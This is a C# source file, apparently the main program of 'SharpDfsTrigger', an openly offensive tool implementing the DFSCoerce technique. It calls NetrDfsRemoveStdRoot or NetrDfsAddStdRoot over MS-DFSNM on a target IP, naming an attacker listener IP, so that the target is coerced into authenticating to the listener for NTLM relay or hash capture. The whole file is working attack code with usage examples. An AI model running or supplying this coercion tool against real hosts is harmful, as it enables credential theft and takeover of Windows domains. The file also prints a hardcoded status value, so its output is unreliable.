using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpDfsTrigger
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            string apicall = "NetrDfsRemoveStdRoot";
            int result;
            if (args.Length < 2)
            {
                Console.WriteLine("usage: SharpDfsTriggeEfs.exe <Target IP> <Listener IP> <API call>");
                Console.WriteLine("usage: SharpDfsTriggeEfs.exe 192.168.1.10 192.168.1.250");
                Console.WriteLine("usage: SharpDfsTriggeEfs.exe 192.168.1.10 192.168.1.250 NetrDfsRemoveStdRoot");
                Console.WriteLine(@"Available API calls:
                  NetrDfsRemoveStdRoot
                  NetrDfsAddStdRoot
                ");
                return;
            }
            if (args.Length >= 3)
            {
                apicall = args[2];
            }
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("NdrClientCall2x64");
            }
            else
            {
                Console.WriteLine("CallNdrClientCall2x86");
            }

            var Dfs = new dfs();
            IntPtr hHandle = IntPtr.Zero;

            try
            {
                switch (apicall)
                {
                    case "NetrDfsRemoveStdRoot":
                        apicall = "NetrDfsRemoveStdRoot";
                        result = Dfs.NetrDfsRemoveStdRoot(args[0], args[1], "test", 1);
                        break;
                    case "NetrDfsAddStdRoot":
                        apicall = "NetrDfsAddStdRoot";
                        result = Dfs.NetrDfsAddStdRoot(args[0], args[1], "test", "testcomment", 1);
                        break;
                    default:
                        apicall = "NetrDfsRemoveStdRoot";
                        result = Dfs.NetrDfsRemoveStdRoot(args[0], args[1], "test", 1);
                        break;


                }
            }

            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return;
            }
            Console.WriteLine($"[*]{apicall}: 5");
        }
    }
}
